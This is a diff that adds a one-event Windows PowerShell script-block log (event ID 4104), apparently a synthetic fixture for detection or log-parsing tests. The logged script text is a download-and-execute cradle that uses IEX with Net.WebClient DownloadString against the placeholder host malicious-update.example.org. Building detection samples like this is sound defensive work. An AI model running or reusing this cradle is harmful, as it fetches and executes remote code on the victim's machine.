@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+<Event><System><Provider Name="Microsoft-Windows-PowerShell"/><EventID>4104</EventID><Level>5</Level><TimeCreated SystemTime="2026-03-01T12:00:00.000000Z"/><EventRecordID>4001</EventRecordID><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WS01</Computer><Execution ProcessID="1234" ThreadID="1"/></System><EventData><Data Name="ScriptBlockId">11111111-2222-3333-4444-555555555555</Data><Data Name="MessageNumber">1</Data><Data Name="MessageTotal">1</Data><Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://malicious-update.example.org/a.ps1')</Data></EventData></Event>
+</Events>
